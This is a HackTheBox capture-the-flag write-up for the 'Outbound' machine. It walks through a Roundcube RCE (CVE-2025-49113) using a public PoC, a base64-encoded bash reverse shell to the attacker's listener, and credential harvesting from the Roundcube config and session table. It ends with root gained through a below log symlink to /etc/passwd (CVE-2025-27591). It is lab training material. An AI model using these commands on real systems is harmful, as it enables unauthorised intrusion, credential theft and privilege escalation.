# Outbound - HackTheBox writeup

## First steps

To begin this box we have credentials (which is very unusual for a linux machine).

tyler:LhKL1o9Nm3X2

Let's first use nmap to see which port are exposed.

```bash
$ nmap 10.10.11.77                                
Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-20 10:05 CET
Nmap scan report for 10.10.11.77
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

There is an http server running on port 80. But when I try to connect to it via `http://10.10.11.77` using Firefox I have this error:

![No route to host](../../../assets/htb/outbound/no_route_to_host.png)

So we need to add the following line to our `/etc/hosts`

```
10.10.11.77     mail.outbound.htb
```

## The Rouncube server

Now we arrive on a [Roundcube](https://roundcube.net/) login page.

![Roundcube login page](../../../assets/htb/outbound/roundcube_login.png)

If we try the credentials of tyler that we have... it works ! And now we can access tyler's mail box but it is kinda empty. 

![Tyler Inbox](../../../assets/htb/outbound/tyler_inbox.png) ![Tyler Sent](../../../assets/htb/outbound/tyler_sent.png) ![Tyler Contacts](../../../assets/htb/outbound/tyler_contacts.png)

There is no contacts, no email sent and no email in the inbox. So we don't have much more things to see here.

However in **About** we can see that the version of Roundcube is a bit old.

![Tyler Contacts](../../../assets/htb/outbound/roundcube_version.png)

## CVE-2025-49113 and reverseshell

After some research, I found the [CVE-2025-49113](https://nvd.nist.gov/vuln/detail/CVE-2025-49113). It allows an authenticated user on Roundcube with version **below 1.6.11** to make a Remote Code Execution on the targeted server.

That should be the key as we are authenticated as tyler and the version of RoundCube is **1.6.10**.

Thanks to a PoC of this vulnerability, made by [hakaioffsec on Github](https://github.com/hakaioffsec), we can try to exploit this vulnerability to see if we can curl a self hosted http.server for example.

First let's launch a http server on our machine using python.

```bash
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And then let's use the PoC to see if we can, indeed, make a RCE.

```bash
$ php CVE-2025-49113.php                                                    
Usage: php CVE-2025-49113.php <url> <username> <password> <command>
$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "curl http://<MY-IP>:8000/foobarbaz"

[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!
```

If we look at our http server... it worked ! Indeed the remote machine try to curl a non-existing directory on our server and we can see it in the printed logs: 

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.77 - - [20/Nov/2025 14:29:06] code 404, message File not found
10.10.11.77 - - [20/Nov/2025 14:29:06] "GET /foobarbaz HTTP/1.1" 404 -
```

Now using a reverse shell from [revshell.com](https://www.revshells.com/) we would be able to access the machine.

Let's start a listener first.

```bash
$ nc -lvnp 9001  
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

And let's execute a revshell command using the PoC from earlier. We will use a revshell with bash but encoded in base64 so that we avoid a lot of special characters that could create problems.

```bash
$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTYvOTAwMSAwPiYx | base64 -d | bash"
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```

On the other hand on our listener the reverse shell worked ! We are now connected on the machine as `www-data`.

```bash
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.77.
Ncat: Connection from 10.10.11.77:42472.
sh: 0: can't access tty; job control turned off
www-data@mail:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I looked at the users that have a home directory on the machine and we have three of them: `mel`, `jacob` and `tyler`

```bash
www-data@mail:/$ ls -la /home
total 32K
drwxr-xr-x 1 root  root  4.0K Jun  8 12:05 .
drwxr-xr-x 1 root  root  4.0K Jul  9 12:41 ..
drwxr-x--- 1 jacob jacob 4.0K Jun  7 13:55 jacob
drwxr-x--- 1 mel   mel   4.0K Jun  8 12:06 mel
drwxr-x--- 1 tyler tyler 4.0K Jun  8 13:28 tyler
```

I tried to authenticate as `tyler` with the same credentials that we used for Roundcube and it worked but his home is empty.

So maybe we have to find credentials for `mel` or `jacob` in the website ressources.

```bash
tyler@mail:/$ cd /var/www/html/roundcube
tyler@mail:/$ ls -la
drwxr-xr-x  1 www-data www-data   4096 Jun  6 18:55 ./
drwxr-xr-x  1 root     root       4096 Jun  6 18:55 ../
-rw-r--r--  1 www-data www-data   2553 Feb  8  2025 .htaccess
-rw-r--r--  1 www-data www-data 216244 Feb  8  2025 CHANGELOG.md
-rw-r--r--  1 www-data www-data  12714 Feb  8  2025 INSTALL
-rw-r--r--  1 www-data www-data  35147 Feb  8  2025 LICENSE
-rw-r--r--  1 www-data www-data   3853 Feb  8  2025 README.md
-rw-r--r--  1 www-data www-data   1049 Feb  8  2025 SECURITY.md
drwxr-xr-x  7 www-data www-data   4096 Feb  8  2025 SQL/
-rw-r--r--  1 www-data www-data   4657 Feb  8  2025 UPGRADING
drwxr-xr-x  2 www-data www-data   4096 Feb  8  2025 bin/
-rw-r--r--  1 www-data www-data   1086 Feb  8  2025 composer.json
-rw-r--r--  1 www-data www-data  56802 Feb  8  2025 composer.lock
drwxr-xr-x  2 www-data www-data   4096 Jun  6 18:55 config/
-rw-r--r--  1 www-data www-data  11200 Feb  8  2025 index.php
drwxr-xr-x  1 www-data www-data   4096 Jun 11 07:46 logs/
drwxr-xr-x 37 www-data www-data   4096 Feb  8  2025 plugins/
drwxr-xr-x  8 www-data www-data   4096 Feb  8  2025 program/
drwxr-xr-x  3 www-data www-data   4096 Jun  6 18:55 public_html/
drwxr-xr-x  3 www-data www-data   4096 Feb  8  2025 skins/
drwxr-xr-x  1 www-data www-data   4096 Nov 20 14:43 temp/
drwxr-xr-x 14 www-data www-data   4096 Feb  8  2025 vendor/
```

First thing interesting in `config/config.inc.php` we have the credentials of the MySQL database

```bash
tyler@mail:/$ cat config/config.inc.php
...
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
...
```

Let's see what the rouncube database is hiding.

## The Roundcube's database

```bash
tyler@mail:/$ mysql -u roundcube -pRCDBPass2025 roundcube
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 84
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [roundcube]> SHOW TABLES;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.001 sec)
MariaDB [roundcube]> SELECT * FROM users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                               |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}         |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}         |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-11-20 14:43:33 | 2025-06-11 07:51:22 |                    1 | en_US    | a:2:{s:11:"client_hash";s:16:"piM9xDyB2J2rtksP";i:0;b:0;} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
```

Usually in this kind of situation we would want to crack the hash of the users in the DB but here it seems that "client_hash" are not hashes passwords.

So here I was blocked and try other tables that could be interesting.

The `session` table could be the key as the session can contain the password of the user that started it.

```bash
MariaDB [roundcube]> SELECT * FROM session;
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| sess_id                    | changed             | ip         | vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

```

It seems that the session object is encoded in base64. I used [CyberChef](https://gchq.github.io/CyberChef/) to decrypt it.

![CyberChef](../../../assets/htb/outbound/cyberchef.png)

So here we've got the session of `jacob` and also a password `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/` but it's encoded and it seems that it's not base64 nor an hashed password.

After some research it appears that `bin/decrypt.sh` is able to decrypt this password.

> Afterward it seems obvious to me that Roundcube has a tool to decrypt what it encrypted...

```bash
tyler@mail:/$ ./bin/decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
595mO8DmwGeD
tyler@mail:/$ su jacob
Password: 595mO8DmwGeD
jacob@mail:/$ cd; ls -la
total 36
drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 .
drwxr-xr-x 1 root  root  4096 Jun  8 12:05 ..
lrwxrwxrwx 1 root  root     9 Jun  6 19:03 .bash_history -> /dev/null
-rw-r--r-- 1 jacob jacob  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 jacob jacob 3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 jacob jacob  807 Mar 31  2024 .profile
drwx------ 1 jacob jacob 4096 Jul  9 12:41 mail
```

## Jacob's emails

So now that we are authenticated as `jacob` it seems that we have access to it's mails in `mail/INBOX/jacob`.

```bash
jacob@mail:/$ cat mail/INBOX/jacob
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
	id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

So we learn two things:
1. Jacob has another password **(gY4Wr3a1evp4)** to login on a specific account
2. He should have the privileges to use `below`... But the binary is not on the machine.

At this point I was blocked because as I said there is not the `below` binary on the machine. And I don't have any clue on what utility has the new password that we found in jacob's mail.

And after looking at other writeups I realize that in fact we are in a docker container !

A lot of things could have make me realize this earlier: the `/.dockerenv` file, the fact that the hostname is *mail* but usualy on HTB machine it's more the name of the box (here it should have been *outbound*).

Also I could have find it if I had just tested the new password to connect to the machine using ssh.

```bash
$ ssh jacob@10.10.11.77      
The authenticity of host '10.10.11.77 (10.10.11.77)' can't be established.
ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.77' (ED25519) to the list of known hosts.
jacob@10.10.11.77's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Nov 20 09:27:18 PM UTC 2025

  System load:  0.54              Processes:             252
  Usage of /:   74.6% of 6.73GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for eth0: 10.10.11.77
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Nov 20 17:51:48 2025 from 10.10.14.91
jacob@outbound:~$ ls -l
total 8
-rw-r--r-- 1 root root  2560 Nov 20 17:52 snapshot_01763661120_01763661120.kpFnnX
-rw-r----- 1 root jacob   33 Nov 20 17:51 user.txt
```

And now we're on the real machine and we can get the `user.txt`

## Go for the root with below

As soon as I arrived on the machine I checked the privileges that jacob has:

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

As we understood it earlier, we have the privileges to use `/usr/bin/below` as root with sudo.

However we can't use some flags as you can see, but we will deal with this.

When looking at CVEs that could be helpful with a `/usr/bin/below` with root privilege I found [CVE-2025-27591](https://nvd.nist.gov/vuln/detail/CVE-2025-27591). And to be honest that's clearly our key to go root. Let me explain:

In vulnerable versions of `below` there is a world-writeable directory `/var/log/below`. And in this directory there is a `error_root.log` file
that is `chmod 666` by `below` before writing in it.

But in this case an attacker could create a symlink on an arbitrary file and this file would be `chmod 666` automatically. This is a critical vulnerabilty considering that we can write in `/etc/shadow` or `/etc/passwd`.

So first let's check if we have the necessary setup for this attack.

```bash
jacob@outbound:~$ ls -l /var/log/
...
drwxrwxrwx  3 root      root               4096 Nov 20 17:57 below
...
jacob@outbound:~$ ls -l /var/log/below/
total 4
-rw-rw-rw- 1 root root    0 Nov 20 17:57 error_root.log
drwxr-xr-x 2 root root 4096 Nov 20 17:51 store
```

And now let's exploit the vulnerability by creating a new user with root privileges and no password in `/etc/passwd`

```bash
jacob@outbound:~$ cd /var/log/below/
jacob@outbound:/var/log/below$ ln -sf /etc/passwd error_root.log
jacob@outbound:/var/log/below$ sudo /usr/bin/below snapshot --begin now 2>/dev/null
Snapshot has been created at snapshot_01763676478_01763676478.58FjcZ
jacob@outbound:/var/log/below$ echo "pwned::0:0:,,,:/root:/bin/bash" >> /etc/passwd
jacob@outbound:/var/log/below$ su pwned
root@outbound:/var/log/below#
```

And now we are `root` !

> The flag can be found in `/root/root.txt`